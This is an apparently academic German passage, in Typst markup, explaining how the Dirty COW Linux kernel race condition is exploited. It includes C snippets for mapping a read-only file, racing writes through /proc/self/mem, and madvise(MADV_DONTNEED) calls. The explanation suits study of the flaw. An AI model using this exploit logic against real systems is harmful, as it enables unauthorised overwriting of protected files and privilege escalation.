== Ausnutzen der Schwachstelle
Zur Ausnutzung der Schwachstelle wird die Funktion mmap() verwendet, um eine Datei in den Speicher zu laden, obwohl sie lediglich über Leserechte verfügt. Da notwendige Berechtigungen nicht zur Verfügung stehen, wird die Datei als Read-Only gemappt. MAP_PRIVATE muss verwendet werden, um dem Betriebssystem signalisieren, dass eine private Kopie der Datei erstellt werden wollen, wenn versucht wird diese zu beschreiben @dirtycowpoc.
#figure([
```c
struct stat st;
int f = open(path, O_RDONLY);
fstat(f, &st);
void *map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
```
], caption: [mappen der Datei],
) \

Der Exploit basiert auf dem gleichzeitigen Ausführen zweier Operationen. Zur Erhöhung der Eintrittswahrscheinlichkeit dieses Zustands werden zwei Threads gestartet, die die beiden betreffenden Operationen wiederholt ausführen.:
1.	Schreibzugriff auf eine gemappte Pseudo-Datei
Hierbei wird eine Datei mittels mmap() in den Speicher gemappt, obwohl sie lediglich über Leserechte verfügt. Die Verwendung einer Pseudo-Datei, setzt den Ursprung des Page-Faults aus einen Prozess, welche eine COW-Page erzeugt und beschreibt @dirtycowpoc.
#figure([
```c
void procselfmemThread(void *map, char *new_text, int file_offset) {
  int f = open("/proc/self/mem", O_RDWR);
  int i, c = 0;
  for (i = 0; i < 100000000; i++) {
    lseek(f, ((uintptr_t)map+file_offset), SEEK_SET);
    c += write(f, new_text, strlen(new_text));
  }
}
```
], caption: [beschreiben der gemappten Datei],
) \

2.	madvise()-Aufruf mit MADV_DONTNEED
Dieser Aufruf signalisiert dem Kernel, dass die aktuell verwendete COW-Seite nicht mehr benötigt wird. In der Folge wird die COW-Seite verworfen, sodass die virtuelle Adresse wieder auf die ursprüngliche, gemeinsam genutzte physische Speicherseite zeigt @dirtycowpoc.
#figure([

```c
void madviseThread(void *map) {
  int i, c = 0;
  for (i = 0; i < 100000000; i++) {
    c += madvise(map, 100, MADV_DONTNEED);
  }
}
```
], caption: [Freigeben der COW-Page],
) \

Wird die COW-Seite exakt zwischen dem vorletzten und dem letzten Page Fault entfernt, zeigt die virtuelle Adresse unerwartet auf die Shared Page statt auf die erwartete private Kopie. Da der letzte Page Fault lediglich ein Read-Fault ist, erfolgt keine erneute Überprüfung der Schreibberechtigung. Die Shared Page ist als „dirty“ markiert und wird zurück in die zugrunde liegende Datei geschrieben. @analysis
